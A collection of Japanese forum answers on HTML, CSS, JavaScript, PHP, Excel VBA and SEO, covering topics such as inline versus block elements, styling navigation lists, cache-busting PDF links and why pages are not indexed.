a要素は行内(インライン)要素です。この行内要素ブロック要素の区別はHTML/CSSで重要なので覚えておくこと。 HTML4.01 　7.5.3 ブロックレベル要素と行内要素( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/global.html#h-7.5.3 ) CSS2.1 　9.2.1 ブロックレベル要素とブロックボックス( http://momdo.s35.xrea.com/web-html-test/spec/CSS21/visuren.html#block-boxes ) 　9.2.2インラインレベル要素とインラインボックス( http://momdo.s35.xrea.com/web-html-test/spec/CSS21/visuren.html#inline-boxes ) ※ a要素をボックスにする。(display:inline-block) ※ ボックスモデルの寸法はpadding辺の内側になる。 　　hover時にborderやpaddingを指定するとずれるのであらかじめ透明色(transparent)で指定しておく。 結果・・・ header ul{ text-align:center;/* 中央配置floatは使わない */ width:100%;/* 適当な幅に */ margin:0 auto;padding:0; } header ul li{ list-style:none; display:inline-block; position:relative; width:20%;/* 適当な幅に */ padding:5px; } header ul li+li{ margin-left:70px;/* 二つ目以降は70px左をあける */ } header ul li a{ text-decoration:none; display:block; width:100%;height:100%;/* 直近のstatic以外の親ブロック(li)に対して */ border-bottom:solid 2px transparent; } header ul li a:hover{ border-color:red; }
余談ですが関数名をスペルミスしてましたね。 こちらでどうぞ。 <HTML> <HEAD> <META HTTP-EQUIV="Content-Script-Type" CONTENT="text/javascript"> <TITLE>リンクをランダムに表示する方法</TITLE> <SCRIPT TYPE="text/javascript"> var rlink = new Array();//リンクの配列 rlink[0] = "a.html"; rlink[1] = "b.html"; rlink[2] = "c.html"; rlink[3] = "d.html"; function RandomLink() { var random = Math.floor( Math.random() * rlink.length ); //randomは0～3のいずれかになる document.getElementById("RandomLink").href = rlink[random]; //id="RandomLink"のhrefを書き換える } </SCRIPT> </HEAD> <BODY> <a id="RandomLink" href="" onclick="RandomLink()">ランダムに開きます</a> </BODY> </HTML>
>フラッシュのチャットはレンタルですので何もいじれません。 そうなると、こちら側で自分で実装するしかないね。 >ですので別のＨＴＭＬの部分に別のフラッシュかＪＡＶＡでノックするボタンを付ければと思っておりますが、私には難しいです。 わかる人に頼むか、お金出して作ってもらうしかないと思う。 >ですので、入室を感知するのではなくてボタンを押すことで、言われるような方法なのかなと思ったり。 うん、入室どうのこうのはそのレンタルしている側のシステムでしか拾えないから、 htmlを表示した際に実行されるようにこっちで作るしかない。
背景で指定しているのでしょうね。 background:url() no-repeat;とかにしましょう。
link集のようなページをコピーしてエクセルに貼り付け、次のユーザー定義関数を使ってみてください。 エクセルのハイパーリンク先のURLを取得するユーザー定義関数 数式で設定しているものを除きます。 ファイルやドキュメント内リンクも除きます。 URLは、最初に設定しているhttpから始まっているものを返します。 A1セルに設定しているハイパーリンクのURLを表示するには、以下の式を使います。 = GetURL(A1) 設定方法は、 １．Alt + F11 で VBE(Visual Basic Editor)を開きます。 ２．VBE のメニューから[挿入] -->[標準モジュール] を指定します。 ３．コードウィンドウに下記コードをコピーして貼り付けます。 ４．右上隅の×でウィンドウを閉じ、シートに戻ります。 ５．メニューから[開発]の[マクロのセキュリティ]の、 「マクロの設定」で「警告を表示してすべてのマクロを有効にする」、 　「開発者向けのマクロ設定」で「VBAプロジェクト　オブジェクト　モデルへのアクセスを信頼する」にチェックを入れてOKをクリックする。 これで、GetURL関数が使用できる状態になります。 Function GetURL(Rng As Range) As String Dim Adr As String If Rng.Hyperlinks.Count > 0 Then With Rng.Hyperlinks(1) If .Address Like "http*" Then Adr = .Address End If End With End If If Adr <> "" Then GetURL = Adr Else GetURL = "" End If End Function
　どんな優れたオーサリングツール・CMS・テンプレートを使おうが、必ずHTML/CSSのと知識は必要です。それどころか、テキストエディタで作成する以上に知識が必要です。ここを誤解されていませんか??。HTML/CSSの知識が必要な事は分かると思いますが、それ以上に他人の作成したテンプレートを解析する能力や、仕組みや癖の知識が必要なのですから・・・。 　想像するに、リンクに限らず、その部分の文字列の選択もできないのじゃないかと思います。単にレイヤがかぶさっいるだけじゃないかと・・ 　ところで、そのテンプレート・・ディスプレイ幅が狭いと使えないですね。 　ウェブ開発されているなら当然、開発者向けツール( https://addons.mozilla.jp/firefox/extensions/developer_tools/ )の豊富なfirefoxお使いだと思いますが、firebugで該当する要素の上に他の要素がかぶさっていないか確認してみてください。ならz-indexの制御で何とかなるかと・・
これらは違う。 HTML: SGMLを参考に作られたもので、目的は文書をそれを構成する要素(Element)に分解して、それぞれの要素をタグでマークアップするマークアップ言語 　その意味では、SGMLの背景( http://ja.wikipedia.org/wiki/Standard_Generalized_Markup_Language#.E8.83.8C.E6.99.AF )を読むのが最も分かりやすいでしょう。 　HTMLで記述されたファイルが、見出しはゴシック体で太文字で見えたり、段落で改行して見えることとは無関係です。 スタイルシート: 色々あるけどCSSについて 　スタイルシートは、そのHTMLをどのようにプレゼンテーションするかを指定するものです。ブラウザで、それなりに見えるのはブラウザが持つスタイルシートによるものです。 文書構造とプレゼンテーションの分離( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/intro/intro.html#h-2.4.1 ) ・・・まずこの二つを明確に分けてください。 Wordpressは、コンテンツマネージメントシステム(CMS)の一分野であるブログシステムのひとつです。 コンテンツマネージメントシステム( http://ja.wikipedia.org/wiki/%E3%82%B3%E3%83%B3%E3%83%86%E3%83%B3%E3%83%84%E3%83%9E%E3%83%8D%E3%83%BC%E3%82%B8%E3%83%A1%E3%83%B3%E3%83%88%E3%82%B7%E3%82%B9%E3%83%86%E3%83%A0 ) |　　データベースから、HTMLやCSSをサーバーサイドで動的に合成する。 | | |-- 汎用 |　　　XOOPSなど |-- 電子商取引 |-- 教育 |-- ブログシステム(Web上に日記を作成するツール) |　　|-- Movable Type |　　|-- WordPress　　★　この位置付けがWordpress |　　└-- などたくさんある。 |-- ウィキ |-- ソーシャル・ネットワーキング・サービス (SNS)★ 　　　SNS用はこちらになる。 　　　SNSサービスであるMixiは、 ・ソーシャル・ネットワーキング・サービス( http://ja.wikipedia.org/wiki/%E3%82%BD%E3%83%BC%E3%82%B7%E3%83%A3%E3%83%AB%E3%83%BB%E3%83%8D%E3%83%83%E3%83%88%E3%83%AF%E3%83%BC%E3%82%AD%E3%83%B3%E3%82%B0%E3%83%BB%E3%82%B5%E3%83%BC%E3%83%93%E3%82%B9 ) 　例えば、OpenPNE( http://ja.wikipedia.org/wiki/OpenPNE )がSNS向けのCMSになります。 ＞以前、Webディレクター経験者の方から聞いたところ、できることの違いはあまりないと言われました。 　いくらなんでも酷い言い方ですね。「動力源と車輪」と「プリウス」は、できること違いはない。と言うようなものです。そりゃそうも言えなくもないが・・・おかしいのは分かるでしょう。 ★Wordpressは、あくまでブログシステムです。実際にはCMSとしても使われている。 　しかし、SNSとしては使うのは無理があるでしょう。 　PHPなり、CGI(Perl,Ruby)を利用して新たに書き起こしたほうがよいような気がします。
＞私は初心者に優しくかつ覚えやすいお勧めの著書はあると思います。 　今年の9/16にやっと勧告になったもので、その直前にもmain要素の追加などがされました。 　ですから、まだありません。 ＞誰もが初めからこのような小難しい仕様書を読むことが出来れば、初心者なんてこの世にいないと思いますが・・・。 　小難しくはないです。正確に書こうとすると回りくどく感じるだけで、無駄なことは書いてないし、極めて効率的ですよ。 　私は、今から15年前、HTML4.01が勧告になった直後に、様々な書籍を買いあさりました。しかし、結局どれも ［こうするときはこうしなさい!!］しかない。それって数学や化学の勉強をする時に問題集をひたすら解いて解き方を覚える手法と変わらない。膨大な実例を経験したって、現実に問題に遭遇したときの解決にはならない。結局、理論・定義まで遡るしかない。 　なら、基本からきっちり学んだほうが早いし間違いがない。応用も利きますしね。HTML4.01の仕様書なんて、主文は高々数十ページしかない。慣れないうちはあなたと同じように「難しく」感じていましたが、すぐ慣れました。 　以前のようにtransitinalやframesetは必要ないですから、当時に比べたらはるかに楽でしょう。 　HTML5は、HTML4.01strictの直系の子孫です。(HTML3.2→HTML4.01とは違う) 　私はRubyではなくPerlですが、最終的には、プログラミングPerl( http://www.oreilly.co.jp/books/4873110963/ )に行き着く。 　HTML4.01をとにかく通しで読んでおきましょう。その後HTML5への変更箇所を学べばよいです。へたな本を読むより、確実に本道を歩めるし簡単だし間違いない。 良いサイト ⇒HTML5.JP - 次世代HTML標準 HTML5情報サイト( http://www.html5.jp/ ) 　⇒HTML5タグリファレンス - HTML5.JP( http://www.html5.jp/tag/index.html ) 　あくまでHTML4.01をマスターしていての話ですが、html5doctorは悩むところを解説してある。
クライアントのブラウザの設定によらずというのは不可能です。 例えばIEだと、新しいページがあるかを、「表示する度に確認する」から「確認しない」まで4段階ありますが、「確認しない」に設定されるとどうしようもないです。 有効期限で工夫するしないと思いますよ。あるいはユーザー教育か。
※ metaが２つあるのは単純にコピペミスでしょうか？ 解決策になるかどうかわかりませんが、og:imageは200x200 pixelが最小値だそうで、それより小さいとかはないでしょうか？確認してみてください。 あと、FBが提供しているデバッグツールもあるようなのでこの辺を利用して確認してみると良いかもしれません。
んー、いろいろと修正点があります。 <center>とかはほとんどのバージョンで非推奨だから見た目の設定はスタイルシートで。 文字コードも特に縛りが無いならutf-8をお勧め。 タグや各タグの属性は小文字で。xhtmlは小文字で書くのが正しい。 <br>で表示を調整しない。<br>は<br /> もう言っていたけどtableでレイアウトしない。 img height="800px"とあるけどheight="800"と単位は付けない。 ・・・！ここじゃないの？<img>のheightに800ってつけたら、それに引っ張られると思うんだけど。 上記の修正点とheight="600"を直して動かして。 それで直るかはわからないけど ちなみに、開発者ツールはブラウザでF12キー押せば大体のブラウザで出てくる。
css2.1の仕様で申し訳ないけど http://www.w3.org/TR/CSS21/syndata.html#numbers 4.3.1からすると . の前に0個以上の整数って書いてあるから .5 という記述は仕様上間違いではないわ
div#main{position:relative;min-height:300px;border:10px blue solid;background-color:red;} div#main:before{content:"";display:block;width:110%;height:110%;top:-5%;left:-5%;position:absolute;background-color:yellow;z-index:-5;} borderは簡略化プロパティですから border-style,border-width,border-colorをあわせて指定します。
１．HTMLだけでFORMやAタグにに何か追加するだけで実現可能かと言うことであれば不可能です。 JavaScriptを使う XMLHttpRequest() であれば可能です。 ２．サーバーサイドでプログラムを動かせば可能です。 そもそも何をしたいのかを具体的に書くと、良いアドバイスが得られる可能性があります。 つまり、 ＞HTTPリクエストヘッダーにある情報を設定し、 ＞そして、そこから別のページに遷移しその別のページで、遷移前に設定していた ＞ＨＴＴＰリクエストヘッダーの情報を読み込みたい によって何をしたいかです。
個人的にはCSS3はどんどん普及してもらいたいのですが、自分のもらう案件ではまだまだIE7に対応させろと無茶ぶり言われるので未だにCSS2で後方互換を持たせています。 要はターゲット次第ですね。 実際のモダンブラウザのシェアは9割以上ですし、IE7を使っているようなユーザーが収益を生むとも考えられません。 まだまだCSS3には草案があふれています。border-関連のような確定したものなら使ってもいいと思いますが、草案段階のもの（ベンダープレフィックス必須）は使わないほうがいいと思います。
対象セルにクラスをつけて指定するという方法はダメでしょうか？ <style> td.column { width:10% } </style> <table border=1 cellspacing=1 cellpadding=1> <tr><td>a</td><td>b</td><td class="column">c</td></tr> <tr><td>1</td><td>2</td><td class="column">3</td></tr> </table> ターゲットブラウザにもよりますが、nth-childはモダンブラウザにしか効きませんのであまりおすすめできません。 それとサイズを厳密に調整したいのであればborder,cellpaddingは0にして全てスタイルで指定したほうがいいと思います。なぜならwidth=10%+cellspacing+border+cellpaddingになってしまいますから。
あいにくFC2は利用していないので、よくわかりませんが。 CSSの方でoverflow設定してみてはどうでしょう。 http://ojiba.blog4.fc2.com/blog-entry-294.html
フォーム エンターで送信しないで、検索すると色々な方法が見つかります、たとえば http://allabout.co.jp/gm/gc/23972/ それと、そのフォームは入力数が多いので、段階的入力機能が付いた下のメールフォームに変えるとかされたらいかがですか。 http://www.synck.com/contents/download/cgi-perl/mailformpro.html
●間違いについて <span class="name"><h2>見出し</h2></span> これ間違いです。spanの中にはh2は入れられません。入れられたとしても、spanの指定がh2に反映されることなく、h2への指定はそのまま残るのでなんら変わらないと思います。 【勉強すべき事】 内包できる要素は、要素により決まっています。親になる要素も決まっています。 文書宣言によるのですが、html4までなら、「インライン要素に、ブロックレベル要素は入れられません」と単純なルールですが、html5はそうも言いきれません。がしかし、spanの中にはh2はhtml5でも入れられません。 このあたりのことは、きちっと入門書を前から順番に習得する場合には最初のうちにでてくるのですが、つまみ食い的な学習方法だと知らないままの方が躓く所です。 h2にはspanは入れられます。がしかし、h2の中にspanを入れた所で、結果は新しいspanのmarginが0になるだけなので、なんら、変わらないでしょう。 ●提案 では、どうするかというと、特定の見出しのみ<h2 class="name">とされてはいかがでしょうか？ classを付ける為だけにspanやidを入れるのは、つまみ食い的に学習をするかたによく見られる間違いです。 【勉強すべき事】 spanやdivにだけidやclassが付けられると思っている方がおられますが、全てのタグに付けられます。 ●エスパー提案 さらに、最初の１つだけとのことですので、なにの最初かわからないのですが、 <h1>見出し</h1> <h2>今回の見出し</h2> h1とすぐ後に続くh2への指定は、 h1+h2{margin-top:0;} で、対応可能です。この場合、ことさらに、class="name"を入れる必要はありません。 【勉強すべき事】 セレクタの文法 前述ののセレクタは「隣接兄弟セレクタ」と呼ばれる物です。 また、最初の子要素を示す、「first-child疑似クラス」というセレクタを利用しても、class="name"を付ける必要はありません。
今はbordercolor,cellspacingは使うこと無いですよ。 bordercolorという属性は存在しません。 cellspacing、 cellpadding は今は使われなくなりましたが、それぞれの関係は長くなるので 11.3.3 コマのマージン( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/tables.html#h-11.3.3 ) を読んでください。 ★現在は、プレゼンテーションはスタイルシートで指定するのが基本です。 『スタイルシートはこれらの問題を解決すると同時に、HTMLにおける制限されたプレゼンテーション機構に取ってかわる。スタイルシートでは、行間の設定やインデントの設定、テキスト色や背景色、フォントのサイズとスタイル、その他様々なプロパティの設定が簡単にできる。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/present/styles.html#h-14.1 )』 　下記に簡単なサンプル上げておきます。 　ご覧のように、細かい設定や複雑な設定がスタイルシートで自在にできます。 ★Another HTML Lint - Gateway( http://www.htmllint.net/html-lint/htmllint.html# ) 　のDATA入力で確認済みのHTML4.01strictです。 ★タブは＿に置換してあるので戻す。 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- html,body{margin:0;padding:0;} h1,h2,h3,h4,h5,h6{margin:0;line-height:1.6em;} p{text-indent:1em;} div.header,div.section,div.footer{width:90%;min-width:630px;max-width:900px;margin:0 auto;padding:5px;} /* table関連 */ th,td{padding:0.5em 1em;} table+table{margin:10px;} table[summary="test1"]{border-collapse:collapse;} table[summary="test2"]{border: red dotted 5px;} table[summary="test2"] th{border: solid 2px blue;} table[summary="test2"] td{border: solid 2px green;} table[summary="test3"]{ border:outset 5px gray; border-collapse: separate; border-spacing: 15px 5px; } table[summary="test3"] th, table[summary="test3"] td{ border:inset gray 5px; } table[summary="test4"]{ border-top:dashed 5px aqua; border-right:double 10px gray; border-bottom:groove 5px red; border-left:ridge 5px lime; border-collapse: separate; border-spacing: 5px; box-shadow:10px 10px 10px 10px rgba(0,0,0,0.4); } table[summary="test4"] th, table[summary="test4"] td{ border:inset gray 5px; } table[summary="test4"] td+td{border-color:maroon;} table[summary="test4"] td+td+td{border-color:orange;} table[summary="test4"] td+td+td+td{border-color:teal;} --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<table border="1" summary="test1"> ＿＿＿<tbody> ＿＿＿＿<tr> ＿＿＿＿＿<th abbr="a">abc</th><th abbr="e">efg</th><th abbr="h">hij</th> ＿＿＿＿</tr> ＿＿＿＿<tr> ＿＿＿＿＿<td>abc</td><td>efg</td><td>hij</td> ＿＿＿＿</tr> ＿＿＿</tbody> ＿＿</table> ＿＿<table border="1" summary="test2"> ＿＿＿<tbody> ＿＿＿＿<tr> ＿＿＿＿＿<th abbr="a">abc</th><th abbr="e">efg</th><th abbr="h">hij</th> ＿＿＿＿</tr> ＿＿＿＿<tr> ＿＿＿＿＿<td>abc</td><td>efg</td><td>hij</td> ＿＿＿＿</tr> ＿＿＿</tbody> ＿＿</table> ＿＿<table border="1" summary="test3"> ＿＿＿<tbody> ＿＿＿＿<tr> ＿＿＿＿＿<th abbr="a">abc</th><th abbr="e">efg</th><th abbr="h">hij</th> ＿＿＿＿</tr> ＿＿＿＿<tr> ＿＿＿＿＿<td>abc</td><td>efg</td><td>hij</td> ＿＿＿＿</tr> ＿＿＿</tbody> ＿＿</table> ＿＿<table border="1" summary="test4"> ＿＿＿<tbody> ＿＿＿＿<tr> ＿＿＿＿＿<th abbr="a">abc</th><th abbr="e">efg</th><th abbr="h">hij</th><th abbr="k">klm</th> ＿＿＿＿</tr> ＿＿＿＿<tr> ＿＿＿＿＿<td>abc</td><td>efg</td><td>hij</td><td>klm</td> ＿＿＿＿</tr> ＿＿＿</tbody> ＿＿</table> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2013-03-03</dd> ＿＿</dl> ＿</div> </body> </html>
下記の2点を守る必要があります。 ・URLは英数で指定する。 ・リンク先にはURLで指定したidを付与する。 <a href="#photo">写真</a> ・ ・ ・ <div id="photo> 写真 </div>
なぜ仕様書読まない!!・・ 　反対車線を走ったら法律違反と言われた。「反対車線走行ってそんなに罪が重いのですか？ 」と言われても 順不同リスト (UL)、序列リスト (OL)、及びリスト項目(LI)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/struct/lists.html#h-10.2 ) <!ELEMENT UL - - (LI)+ -- unordered list --> <!ELEMENT OL - - (LI)+ -- ordered list --> 　olもulも(LI)+ すなわちLIが一個以上(+) と書いてあり、それ以外は入れられません。 　もし存在するとブラウザによって解釈は異なりますが、そこに<li></li>が書き漏らされていると判断して、 <li></l><br> <li></li> ↓ <li></li> <li><br></li> <li></li> と無理やり解釈しなければなりません。当然ブラウザによってこの処理は違う可能性がありますから、表示が異なる結果を招きます。 <div class="nav"> 　<ul> 　　<li><a href="apple.html">アップル</a></li> 　　<li><a href="orange.html">オレンジ</a></li> 　　<li><a href="grape.html">グレープ</a></li> 　　<li><a href="index.html">TOP</a></li> 　</ul> </nav> てしたら、 <div class="nav"> 　<ul> 　　<li><a href="apple.html">アップル</a></li> 　　<li><a href="orange.html">オレンジ</a></li> 　　<li style="margin-bottom:1em;"><a href="grape.html">グレープ</a></li> 　　<li><a href="index.html">TOP</a></li> 　</ul> </div> とか・・ div.nav ul li:last-child{margin:top:1em;} これだと項目がいくつ増えても最後の項目だけ行間が開く。
> となりますと、 > (1)header("Location: disp_access.php?～＝～&"); > などとして、クエリーをGETで渡すなどでしょうか。 > > (2)セッション変数を用いたりするのでしょうか。セッション変数を使った > 場合の、スコープというのは、たとえば画像アクセス解析ページなどに > おいて、トップページがあるフォルダ内のソースファイルで宣言した場合、 > その中にある中、小フォルダにあるソースファイル内でも有効でしょうか。 言っている意味がまったく理解できないけれど、早い話、表示しているファイル自身がPHPならば、$_SERVER['REMOTE_ADDR']と、$_SERVER['HTTP_REFERER']だけで事足りるっていう話です。 表示しているファイルがhtmlファイルならば、No.1さんの回答通りにajax通信すればいいだけなので、formは必要ないですよ。 あと、用語をいろいろと勘違いされているようなので、他者に質問されるときは、聞きかじった用語を背伸びして使わないほうが混乱を防げると思いますよ。
HTMLリンクの方を弄れる前提なら、URLが変わればキャッシュが使われることはないという仕組み(？)を利用できます。 単純に言えば、 <a href="./test20140930.pdf"><img src="/image/banner.gif"></a> ↓ <a href="./test20141002.pdf"><img src="/image/banner.gif"></a> こんな感じで、更新日をファイル名に加えてしまうという方法です。 ※ファイル名が変わればいいだけなので、かならずしも更新日にする必要はない 管理の都合上などで、ファイル名は変更できないということであれば、パラメーターを付けるという方法でも代用できます。 <a href="./test.pdf?a=20140930"><img src="/image/banner.gif"></a> ↓ <a href="./test.pdf?a=20141002"><img src="/image/banner.gif"></a> これも同じく、パラメーターは(ファイルの更新毎に)毎回違えばいいだけなので、別に日付にする必要もない。 ※別にpdfやサーバー側でパラメーターを取得するといった処理は不要、余分なパラメーターがついていても無視されるだけなので 始終PDFが更新されるので、そのたびにHTMLの更新なんかいちいちやってられない、というレアケースなら… HTMLの出力をCGIやPHPなどのサーバーサイドスクリプトで行う方法もアリですが… そのあたりは、サイトの内容やらPDFの内容やらを検討した上で仕様を決定しないと ・無駄に毎回PDFをダウンロードして反応速度が遅くて新たな不満が ・サーバーに始終PDFを取りにいくので、月間転送量上限に引っ掛かり大きな費用負担が 等々、あらたな問題が発生する可能性もあるため詳細は割愛。
No4です。 No7において、補足です。 D&Dしたファイルは、ダミーがファイル名（拡張子除く）で置換されて上書きされます。 複数のファイルをまとめてD&D出来ます。 「置換.wsf」の以下の箇所を変更して頂ければ「ダミー」意外にも対応できます。 strRepl="ダミー"; /* 置換対象文字列 */ 各htmlファイルの中で使用されている「ダミー」が全て置換されます。 「ダミー.jpg」以外にも「ダミー」を使用している場合、以下の2箇所を変更してください。 (1) strRepl="ダミー"; /* 置換対象文字列 */ 　　　　　↓ strRepl="ダミー.jpg"; /* 置換対象文字列 */ (2) strWith = objFs.GetBaseName(objArg(i)); 　　　　　↓ strWith = objFs.GetBaseName(objArg(i))+".jpg";
No.2のスタイルシートを説明を入れてあげておきます。このままスタイル部分を入替えると良いです。 ★背景色の指定はbackground-color、文字色はcolorです。 ★screenメディアのみのスタイル。印刷や携帯電話には適用されません。 　印刷プレビューで確認できます。 　印刷機や携帯用には、別のスタイルを書くことができます。 ★ウィンドウを狭めてみると分かるようにスマホ縦置き以上の幅があればきちんと表示されるはずです。 ★タブは＿に置換してあるので戻す。 慣れるまで、大変だと思いますが、慣れてしまえば 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから スタイルシートはこれらの問題を解決すると同時に、HTMLにおける制限されたプレゼンテーション機構に取ってかわる。スタイルシートでは、行間の設定やインデントの設定、テキスト色や背景色、フォントのサイズとスタイル、その他様々なプロパティの設定が簡単にできる。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Style Sheets in HTML documents (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/present/styles.html#h-14.1 )］より になります。 そのまえに、 　⇒HTML 4.01 Specification (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html401j/cover.html ) を読んで、HTMLの基本だけは理解するほうが絶対に早く効率的です。 　とりあえず、どこに何が書いてあるかだけでも知っておくくらいでよい。 Anothter HTML LintをパスするHTMLが書けるようになったら 　⇒Cascading Style Sheets Level 2 Revision 1 (CSS 2.1) Specification (ja)( http://momdo.s35.xrea.com/web-html-test/spec/CSS21/cover.html ) ★皆通ってきた道です。変なサイトで変なこと覚えると、直すのが大変です。 　最初から本道をたどるほうが早い。 <style type="text/css" media="screen"> <!-- html,body{margin:0;padding:0;}/* ブラウザの余白を消す */ p{ ＿text-indent:1em;/* 日本語なので段落が変わると一文字下げる */ ＿line-height:1.6em;/* 日本語も字が大きいので一行を高く */ ＿margin:0;/* marginは0 */ } div.header,div.section,div.footer{/* これらのdivブロックは */ ＿width:90%;min-width:470px;max-width:900px;/* 標準幅、最小幅、最大幅を指定 */ ＿margin:0 auto;/* 中央寄せ! これが中央寄せ */ ＿padding:5px;/* 周囲の余白 */ ＿background-color:rgb(255,255,160);/* 背景色を指定 */ } div.header h1{ ＿background-color:orange;/* 背景色 */ ＿border:outset orange 2px;/* ボーダー(枠線)の色と形 */ ＿line-height:2em;/* 行を高く */ ＿padding:0 10px;/* 内部の余白 */ ＿color:white;/* 文字の色 */ } div.section{ ＿position:relative;/* 子孫の要素の位置やサイズの基準とするため */ } h2{display:none;}/* 隠す */ div.section div.section{/* section(本文)中のサブセクション */ ＿margin:80px 0 10px 200px;/* 右と上を空ける */ ＿width:auto;min-width:0;/* 幅を上の指定を上書きする */ ＿background-color:white;/* 背景色 */ ＿border:1px solid orange;/* 枠の色 */ } div.section div.section h3{ ＿position:absolute;/* 上にずらしてその場から消す */ ＿top:-80px;/* 上に80px */ ＿width:90%;/* 幅 */ ＿padding:0 5px;/* 内側の余白 */ ＿font-size:20px;/* 文字の大きさ */ ＿line-height:40px;/* 行の高さ */ ＿background-color:white; /* 背景色 */ ＿border:1px solid orange;/* 文字色 */ ＿border-left-width:3px;/* 左のボーダーを広く */ } div.section div.nav{/* 本文中のナビゲーション */ ＿position:absolute;/* 絶対配置 */ ＿top:0;left:0;/* 本文の左上隅 */ ＿width:200px;height:100%;/* 幅と高さ、高さは本文にあわせる。 */ ＿text-align:center;/* 文字は中央 */ ＿line-height:40px;/* 行の高さ */ } div.section div.nav ol{ ＿margin:0;padding:0;/* 余白は0 */ } div.section div.nav ol li{ ＿list-style:none;/* リストじゃなくする */ ＿background-color:orange;/* 背景色 */ ＿border:outset orange 2px;/* 枠のスタイル */ ＿margin:2px;/* 周囲との余白 */ ＿padding:0; ＿color:white;/* 文字色 */ } --> ＿</style>
機能としては標準ですが、運用的にはあまりよろしくないですね すなおに <input type="hidden" name="abc" value="123"> で埋め込めば済む話です ポイントとしては２点、キーが競合する場合がある 一つは$_REQUESTで参照する場合、phpinfo()でcore情報のvariables_orderで 指定されている順の優先順位になります 通常はGPCSなのでGET>POST>クッキー>セッションです もちろん$_GETや$_POSTで明示的に参照すれば問題はありません もう一つはmethodをGETにして、パラメータでも同じキーを渡すと 判断がつかないのでブラウザの解釈によります。 いずれにしろ中途半端になるので、できればデータの受け渡し方法は 一つにまとめた方が無難です。
＞メモ帳を使ってhtmlファイルを作っていたんですが、保存したファイルを開くと、開かないままホームページに飛んでしまいます。 　これはどうしてもならないはずです。!!以下の説明を 「保存したファイルを開くと、開かないままホームページに飛んでしまいます。」 　ファイルをダブルクリックと言う事ですか？ 　別法として、エクスプローラーからファイルを見つけて、そのファイルを右クリックしてコンテキスト（その時点で可能な）メニューを開き、そこにある「開く」では、ブラウザは起動するけど、 そのファイルを開けないということですか？？ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 　拡張子が.htmlや.htmになっていると、Windowsの場合は関連付けされているためブラウザでそのファイルを開くはずです。 単純な下記ファイル <body>タイトル</body> だけをメモ帳で作成して、ファイル名をtest.htmlとして保存してチェック ブラウザには タイトル とだけ表示されるはずです。 ＞開かないままホームページに飛んでしまいます。 　この意味が分からない。ホームページと言う言葉に齟齬がありませんか。これ間違っていると質問事態の意味が伝わらない 　⇒ホームページ - Wikipedia( http://ja.wikipedia.org/wiki/%E3%83%9B%E3%83%BC%E3%83%A0%E3%83%9A%E3%83%BC%E3%82%B8 ) 　ホームページとはブラウザを起動したときに最初に表示されるページの事です。ブラウザの[設定]メニューからホームページを指定する画面に進んで指定します。 　ひょっとして、ホームページをブラウザで表示すること。あるいはウェブサイト、ウェブページと混同されていませんか？ ★ホームページはホーム(出発点/故郷/基点)になるページと言う意味。 「保存したファイルを開くと、開かないままホームページに飛んでしまいます。」 ではなくて、 「メモ帳でHTMLを作成して拡張子を.htmlにして保存すると、ダブルクリック(開く)操作をするとブラウザが起動してしまう」 と言う意味では？？ なら ・ファイルを右クリックしてコンテキストメニューから 　「編集」を選択 　「アプリケーョンから開く」→メモ帳などテキストエディタを指定 ・メモ帳を開いて、そのメニューから開きたいファイルを選択 　
表示させたい箇所にIDが付与されているならば、ページ内アンカーを用いればできます。 相手先のソースが下記のような例で、本文2を表示させたい場合は、 http:/example.com/targetpage.html ----------------------------------- <article id="content1"> 本文1 </article> <article id="content2"> 本文2 </article> -------------------------------------- 下記のようにリンクを書くことができます。 <a href="http://example.com/targetpage.html#contet2">本文2へのリンク</a> ただし、No.1さんが言うとおり、相手先のソース次第なので、ラベル(ID)がないときは諦めるしかありません。
> 一度、canonicalを付けたページはもう、ロボットに認知してもらえないのでしょうか？ そんなことはないと思います。 私なら別の理由を疑います。 問題をcanonicalに限定せずに、インデックスされない理由を全般的に探すことをおすすめします。 すべての可能性を取り除いてから、sitemap.xmlの再送信や、Fetch as Googleを試されてはいかがでしょう。 たとえば以下の様な理由が考えられます。 ・サーバーやプログラムの設定が正常なステータスコードを出していない。 ・誤ったリダイレクトをしている。 ・htmlのmata内にてrobots/noindexなどでクロールを拒否している。 ・robots.txt内にクロールを拒否する記述がある。 ・サーバー側でbotのアクセスを拒否する設定がある。
